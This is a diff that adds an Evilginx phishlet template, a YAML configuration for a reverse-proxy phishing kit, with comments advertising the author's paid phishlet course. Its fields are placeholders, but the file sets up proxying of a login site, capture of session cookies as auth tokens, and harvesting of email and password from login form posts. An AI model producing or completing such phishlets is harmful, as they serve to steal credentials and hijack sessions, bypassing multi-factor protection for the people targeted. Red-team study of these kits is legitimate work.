@@ -1,0 +1,36 @@
+author: 'SimplerHacking'
+min_ver: '3.2.0'
+name: 'My Easy Phishlet Template v2'
+
+# Creating phishlets can be complex, therefore I created the open template to save time and reduce errors in the process
+
+# Learn my process for creating Evilginx Phishlets by signing up for my Phishlet Developer Training Program
+
+# The course will explain my systematic process for coding Evilginx Phishlets from scratch in YAML and what I have learned over the years working with offensive security specialists, hackers & red teams
+
+proxy_hosts: # Count number of Subdomains Using Application + Network Tab = 
+  - {phish_sub: '', orig_sub: '', domain: '', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: '', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: '', session: true, is_landing: true, auto_filter: true}
+
+sub_filters: # use sub_filters to change and modify content
+  - {triggers_on: '', orig_sub: '', domain: '', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+
+auth_tokens: # Look for tokens in cookies sent from the server through Set-Cookie header, Storage Ace & Cookie Editor
+  - domain: '.domain.com'
+    keys: ['kdt','cookie_name1','cookie_name2','cookie_name3']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: '.domain.com'
+  path: '/'
+
+  #
